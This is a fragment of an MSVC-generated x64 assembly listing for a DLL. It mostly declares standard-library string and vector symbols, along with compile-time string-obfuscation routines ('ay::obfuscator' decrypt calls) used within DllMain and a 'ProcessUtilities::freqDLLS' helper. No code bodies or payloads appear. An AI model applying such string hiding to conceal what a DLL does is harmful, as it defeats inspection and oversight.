; Listing generated by Microsoft (R) Optimizing Compiler Version 19.40.33811.0 

include listing.inc

INCLUDELIB OLDNAMES

PUBLIC	?_x@@3HA					; _x
didat	SEGMENT
?_x@@3HA DD	00H					; _x
PUBLIC	??$construct_at@_WAEA_W$0A@@std@@YAPEA_WQEA_WAEA_W@Z ; std::construct_at<wchar_t,wchar_t &,0>
PUBLIC	??$construct@_WAEA_W@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAXAEAV?$allocator@_W@1@QEA_WAEA_W@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::construct<wchar_t,wchar_t &>
PUBLIC	??$forward@AEA_W@std@@YAAEA_WAEA_W@Z		; std::forward<wchar_t &>
PUBLIC	??$_Get_size_of_n@$01@std@@YA_K_K@Z		; std::_Get_size_of_n<2>
PUBLIC	??$_Emplace_back@_W@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAX$$QEA_W@Z ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::_Emplace_back<wchar_t>
PUBLIC	??$construct_at@_W_W$0A@@std@@YAPEA_WQEA_W$$QEA_W@Z ; std::construct_at<wchar_t,wchar_t,0>
PUBLIC	??$_Emplace_back@AEA_W@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAXAEA_W@Z ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::_Emplace_back<wchar_t &>
PUBLIC	??$_Copy_memmove@PEA_WPEA_W@std@@YAPEA_WPEA_W00@Z ; std::_Copy_memmove<wchar_t *,wchar_t *>
PUBLIC	??$to_address@_W@std@@YAPEA_WQEA_W@Z		; std::to_address<wchar_t>
PUBLIC	?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z	; std::allocator<wchar_t>::allocate
PUBLIC	??0?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAA@PEA_WAEAV?$allocator@_W@1@@Z ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::_Uninitialized_backout_al<std::allocator<wchar_t> >
PUBLIC	??1?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAA@XZ ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::~_Uninitialized_backout_al<std::allocator<wchar_t> >
PUBLIC	?_Release@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAPEA_WXZ ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::_Release
PUBLIC	?__autoclassinit2@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAX_K@Z ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::__autoclassinit2
PUBLIC	??$construct_at@PEA_WAEBQEA_W$0A@@std@@YAPEAPEA_WQEAPEA_WAEBQEA_W@Z ; std::construct_at<wchar_t *,wchar_t * const &,0>
PUBLIC	??$forward@AEBQEA_W@std@@YAAEBQEA_WAEBQEA_W@Z	; std::forward<wchar_t * const &>
PUBLIC	??$construct_at@_W$$V$0A@@std@@YAPEA_WQEA_W@Z	; std::construct_at<wchar_t,0>
PUBLIC	??$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z ; std::_Uninitialized_move<wchar_t *,std::allocator<wchar_t> >
PUBLIC	??$_Get_unwrapped@AEBQEA_W@std@@YA?A_TAEBQEA_W@Z ; std::_Get_unwrapped<wchar_t * const &>
PUBLIC	??$construct@_W_W@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAXAEAV?$allocator@_W@1@QEA_W$$QEA_W@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::construct<wchar_t,wchar_t>
PUBLIC	??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >
PUBLIC	??$_Construct_in_place@_W_W@std@@YAXAEA_W$$QEA_W@Z ; std::_Construct_in_place<wchar_t,wchar_t>
PUBLIC	??$_To_address@PEA_W@std@@YA?A_PAEBQEA_W@Z	; std::_To_address<wchar_t *>
PUBLIC	??$_Uninitialized_copy@PEA_WPEA_WV?$allocator@_W@std@@@std@@YAPEA_WPEA_W00AEAV?$allocator@_W@0@@Z ; std::_Uninitialized_copy<wchar_t *,wchar_t *,std::allocator<wchar_t> >
PUBLIC	??$_Unwrap_sent@PEA_WPEA_W@ranges@std@@YA?A_T$$QEAPEA_W@Z ; std::ranges::_Unwrap_sent<wchar_t *,wchar_t *>
PUBLIC	??$_Unwrap_iter@PEA_WPEA_W@ranges@std@@YA?A_T$$QEAPEA_W@Z ; std::ranges::_Unwrap_iter<wchar_t *,wchar_t *>
PUBLIC	??$forward@PEA_W@std@@YA$$QEAPEA_WAEAPEA_W@Z	; std::forward<wchar_t *>
PUBLIC	??$_Copy_n_unchecked4@PEAD_KPEA_W@std@@YAPEA_WPEAD_KPEA_W@Z ; std::_Copy_n_unchecked4<char *,unsigned __int64,wchar_t *>
PUBLIC	??$forward@AEBV?$allocator@_W@std@@@std@@YAAEBV?$allocator@_W@0@AEBV10@@Z ; std::forward<std::allocator<wchar_t> const &>
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1>::_Get_first
PUBLIC	?capacity@?$vector@_WV?$allocator@_W@std@@@std@@QEBA_KXZ ; std::vector<wchar_t,std::allocator<wchar_t> >::capacity
PUBLIC	?_Buy_raw@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::_Buy_raw
PUBLIC	?_Getal@?$vector@_WV?$allocator@_W@std@@@std@@AEBAAEBV?$allocator@_W@2@XZ ; std::vector<wchar_t,std::allocator<wchar_t> >::_Getal
PUBLIC	?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
PUBLIC	?max_size@?$vector@_WV?$allocator@_W@std@@@std@@QEBA_KXZ ; std::vector<wchar_t,std::allocator<wchar_t> >::max_size
PUBLIC	?_Calculate_growth@?$vector@_WV?$allocator@_W@std@@@std@@AEBA_K_K@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::_Calculate_growth
PUBLIC	?_Buy_nonzero@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::_Buy_nonzero
PUBLIC	?_Change_array@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXQEA_W_K1@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::_Change_array
PUBLIC	?_Xlength@?$vector@_WV?$allocator@_W@std@@@std@@CAXXZ ; std::vector<wchar_t,std::allocator<wchar_t> >::_Xlength
PUBLIC	?_Orphan_range@?$vector@_WV?$allocator@_W@std@@@std@@AEBAXPEA_W0@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::_Orphan_range
PUBLIC	??0?$_Vector_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_Vector_val<std::_Simple_types<wchar_t> >::_Vector_val<std::_Simple_types<wchar_t> >
PUBLIC	??1?$_Tidy_deallocate_guard@V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@QEAA@XZ ; std::_Tidy_deallocate_guard<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > >::~_Tidy_deallocate_guard<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > >
PUBLIC	??1?$_Tidy_guard@V?$vector@_WV?$allocator@_W@std@@@std@@@std@@QEAA@XZ ; std::_Tidy_guard<std::vector<wchar_t,std::allocator<wchar_t> > >::~_Tidy_guard<std::vector<wchar_t,std::allocator<wchar_t> > >
PUBLIC	??$_Unfancy_maybe_null@$$CBD@std@@YAPEBDPEBD@Z	; std::_Unfancy_maybe_null<char const >
PUBLIC	??$_Unfancy_maybe_null@$$CB_W@std@@YAPEB_WPEB_W@Z ; std::_Unfancy_maybe_null<wchar_t const >
PUBLIC	??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z	; std::addressof<wchar_t *>
PUBLIC	??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
PUBLIC	??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
PUBLIC	??$_Emplace_reallocate@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_W$$QEA_W@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::_Emplace_reallocate<wchar_t>
PUBLIC	??$_Emplace_back_with_unused_capacity@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEA_W$$QEA_W@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::_Emplace_back_with_unused_capacity<wchar_t>
PUBLIC	??$forward@_W@std@@YA$$QEA_WAEA_W@Z		; std::forward<wchar_t>
PUBLIC	??$_Construct_n@PEA_WPEA_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K$$QEAPEA_W1@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::_Construct_n<wchar_t *,wchar_t *>
PUBLIC	??$move@AEAPEA_W@std@@YA$$QEAPEA_WAEAPEA_W@Z	; std::move<wchar_t * &>
PUBLIC	??$distance@PEA_W@std@@YA_JPEA_W0@Z		; std::distance<wchar_t *>
PUBLIC	??$_Adl_verify_range@V?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@V12@@std@@YAXAEBV?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@0@0@Z ; std::_Adl_verify_range<std::_String_iterator<std::_String_val<std::_Simple_types<wchar_t> > >,std::_String_iterator<std::_String_val<std::_Simple_types<wchar_t> > > >
PUBLIC	??$?0AEBV?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@_W@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> const &>
PUBLIC	??$_Construct_from_iter@PEADPEAD_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXPEADQEAD_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_from_iter<char *,char *,unsigned __int64>
PUBLIC	??$move@AEAPEAD@std@@YA$$QEAPEADAEAPEAD@Z	; std::move<char * &>
PUBLIC	??$distance@PEAD@std@@YA_JPEAD0@Z		; std::distance<char *>
PUBLIC	??$_Adl_verify_range@V?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@V12@@std@@YAXAEBV?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@0@0@Z ; std::_Adl_verify_range<std::_String_iterator<std::_String_val<std::_Simple_types<char> > >,std::_String_iterator<std::_String_val<std::_Simple_types<char> > > >
PUBLIC	??$?0AEBV?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@_W@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> const &>
PUBLIC	??$forward@AEB_W@std@@YAAEB_WAEB_W@Z		; std::forward<wchar_t const &>
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
PUBLIC	?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size
PUBLIC	??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty
PUBLIC	?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
PUBLIC	??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
PUBLIC	?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_empty
PUBLIC	?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
PUBLIC	?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
PUBLIC	?_Unwrapped@?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@QEBAPEADXZ ; std::_String_iterator<std::_String_val<std::_Simple_types<char> > >::_Unwrapped
PUBLIC	?_Unwrapped@?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@QEBAPEA_WXZ ; std::_String_iterator<std::_String_val<std::_Simple_types<wchar_t> > >::_Unwrapped
PUBLIC	??$construct_at@_WAEB_W$0A@@std@@YAPEA_WQEA_WAEB_W@Z ; std::construct_at<wchar_t,wchar_t const &,0>
PUBLIC	??$addressof@_W@std@@YAPEA_WAEA_W@Z		; std::addressof<wchar_t>
PUBLIC	??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z	; std::_Destroy_in_place<wchar_t *>
PUBLIC	??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z		; std::_Unfancy<wchar_t>
PUBLIC	??$_Destroy_range@V?$allocator@_W@std@@@std@@YAXPEA_WQEA_WAEAV?$allocator@_W@0@@Z ; std::_Destroy_range<std::allocator<wchar_t> >
PUBLIC	??$_Refancy@PEAD$0A@@std@@YAPEADPEAD@Z		; std::_Refancy<char *,0>
PUBLIC	??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_String_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z ; std::addressof<std::_String_val<std::_Simple_types<wchar_t> > >
PUBLIC	??$_Refancy@PEA_W$0A@@std@@YAPEA_WPEA_W@Z	; std::_Refancy<wchar_t *,0>
PUBLIC	??$_Emplace_one_at_back@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEA_W$$QEA_W@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::_Emplace_one_at_back<wchar_t>
PUBLIC	??$move@AEA_W@std@@YA$$QEA_WAEA_W@Z		; std::move<wchar_t &>
PUBLIC	??$_Unfancy_maybe_null@_W@std@@YAPEA_WPEA_W@Z	; std::_Unfancy_maybe_null<wchar_t>
PUBLIC	??$_Get_unwrapped@AEAV?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@@std@@YA?A_TAEAV?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@0@@Z ; std::_Get_unwrapped<std::_String_iterator<std::_String_val<std::_Simple_types<wchar_t> > > &>
PUBLIC	??$?0V?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$vector@_WV?$allocator@_W@std@@@std@@QEAA@V?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::vector<wchar_t,std::allocator<wchar_t> ><std::_String_iterator<std::_String_val<std::_Simple_types<wchar_t> > >,0>
PUBLIC	??$?0V?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> ><std::_String_iterator<std::_String_val<std::_Simple_types<char> > >,0>
PUBLIC	??$_Get_unwrapped@AEAV?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@@std@@YA?A_TAEAV?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@0@@Z ; std::_Get_unwrapped<std::_String_iterator<std::_String_val<std::_Simple_types<char> > > &>
PUBLIC	?assign@?$_Char_traits@_WG@std@@SAXAEA_WAEB_W@Z	; std::_Char_traits<wchar_t,unsigned short>::assign
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1>::_Get_first
PUBLIC	?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z	; std::_WChar_traits<wchar_t>::assign
PUBLIC	?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z	; std::allocator<wchar_t>::deallocate
PUBLIC	?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
PUBLIC	?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer
PUBLIC	?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Switch_to_buf
PUBLIC	?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
PUBLIC	?_Getal@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::vector<wchar_t,std::allocator<wchar_t> >::_Getal
PUBLIC	?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
PUBLIC	??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::~_Bxty
PUBLIC	?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate
PUBLIC	?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
PUBLIC	?data@?$obfuscator@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@QEBAPEBDXZ ; ay::obfuscator<38,-7115718816596162265,char>::data
PUBLIC	?decrypt@?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@QEAAXXZ ; ay::obfuscated_data<38,-7115718816596162265,char>::decrypt
PUBLIC	??0?$_String_const_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@QEAA@PEBDPEBU_Container_base0@1@@Z ; std::_String_const_iterator<std::_String_val<std::_Simple_types<char> > >::_String_const_iterator<std::_String_val<std::_Simple_types<char> > >
PUBLIC	?_Tidy@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXXZ ; std::vector<wchar_t,std::allocator<wchar_t> >::_Tidy
PUBLIC	??0?$_String_const_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@QEAA@PEB_WPEBU_Container_base0@1@@Z ; std::_String_const_iterator<std::_String_val<std::_Simple_types<wchar_t> > >::_String_const_iterator<std::_String_val<std::_Simple_types<wchar_t> > >
PUBLIC	?data@?$obfuscator@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@QEBAPEBDXZ ; ay::obfuscator<17,-3520361701531608807,char>::data
PUBLIC	?decrypt@?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@QEAAXXZ ; ay::obfuscated_data<17,-3520361701531608807,char>::decrypt
PUBLIC	?begin@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA?AV?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::begin
PUBLIC	??0?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@QEAA@PEBDPEBU_Container_base0@1@@Z ; std::_String_iterator<std::_String_val<std::_Simple_types<char> > >::_String_iterator<std::_String_val<std::_Simple_types<char> > >
PUBLIC	?end@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA?AV?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::end
PUBLIC	??0?$allocator@_W@std@@QEAA@XZ			; std::allocator<wchar_t>::allocator<wchar_t>
PUBLIC	??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::~_String_val<std::_Simple_types<wchar_t> >
PUBLIC	??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::~_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>
PUBLIC	??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	?begin@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA?AV?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::begin
PUBLIC	??0?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@QEAA@PEB_WPEBU_Container_base0@1@@Z ; std::_String_iterator<std::_String_val<std::_Simple_types<wchar_t> > >::_String_iterator<std::_String_val<std::_Simple_types<wchar_t> > >
PUBLIC	?end@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA?AV?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::end
PUBLIC	??0?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@QEAA@AEBV?$obfuscator@$0CG@$0?GCMABMJACAMGPGNJ@D@1@@Z ; ay::obfuscated_data<38,-7115718816596162265,char>::obfuscated_data<38,-7115718816596162265,char>
PUBLIC	??1?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@QEAA@XZ ; ay::obfuscated_data<38,-7115718816596162265,char>::~obfuscated_data<38,-7115718816596162265,char>
PUBLIC	??B?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@QEAAPEADXZ ; ay::obfuscated_data<38,-7115718816596162265,char>::operator char *
PUBLIC	??1?$vector@_WV?$allocator@_W@std@@@std@@QEAA@XZ ; std::vector<wchar_t,std::allocator<wchar_t> >::~vector<wchar_t,std::allocator<wchar_t> >
PUBLIC	?push_back@?$vector@_WV?$allocator@_W@std@@@std@@QEAAX$$QEA_W@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::push_back
PUBLIC	?data@?$vector@_WV?$allocator@_W@std@@@std@@QEAAPEA_WXZ ; std::vector<wchar_t,std::allocator<wchar_t> >::data
PUBLIC	??0?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@QEAA@AEBV?$obfuscator@$0BB@$0?DANKNGFANMKOGGOH@D@1@@Z ; ay::obfuscated_data<17,-3520361701531608807,char>::obfuscated_data<17,-3520361701531608807,char>
PUBLIC	??1?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@QEAA@XZ ; ay::obfuscated_data<17,-3520361701531608807,char>::~obfuscated_data<17,-3520361701531608807,char>
PUBLIC	??B?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@QEAAPEADXZ ; ay::obfuscated_data<17,-3520361701531608807,char>::operator char *
PUBLIC	?__autoclassinit2@?$vector@_WV?$allocator@_W@std@@@std@@QEAAX_K@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::__autoclassinit2
PUBLIC	??__Fobfuscated_data@?1???R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ@YAXXZ ; ``DllMain'::`4'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
PUBLIC	??__Fobfuscated_data@?1???R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ@YAXXZ ; ``DllMain'::`4'::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
PUBLIC	DllMain
;	COMDAT ??__J?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ@51
_TLS	SEGMENT
??__J?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ@51 DD 01H DUP (?) ; `ProcessUtilities::freqDLLS::<lambda_2>::operator()'::`2'::`local static thread guard'
_TLS	ENDS
;	COMDAT ?obfuscated_data@?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ@4V45@A
_TLS	SEGMENT
?obfuscated_data@?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ@4V45@A DB 0eH DUP (?) ; `ProcessUtilities::freqDLLS::<lambda_3>::operator()'::`2'::obfuscated_data
_TLS	ENDS
;	COMDAT ?obfuscated_data@?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ@4V45@A
_TLS	SEGMENT
?obfuscated_data@?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ@4V45@A DB 0eH DUP (?) ; `ProcessUtilities::freqDLLS::<lambda_1>::operator()'::`2'::obfuscated_data
_TLS	ENDS
;	COMDAT ??__J?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ@51
_TLS	SEGMENT
??__J?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ@51 DD 01H DUP (?) ; `ProcessUtilities::freqDLLS::<lambda_3>::operator()'::`2'::`local static thread guard'
_TLS	ENDS
;	COMDAT ?obfuscated_data@?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ@4V45@A
_TLS	SEGMENT
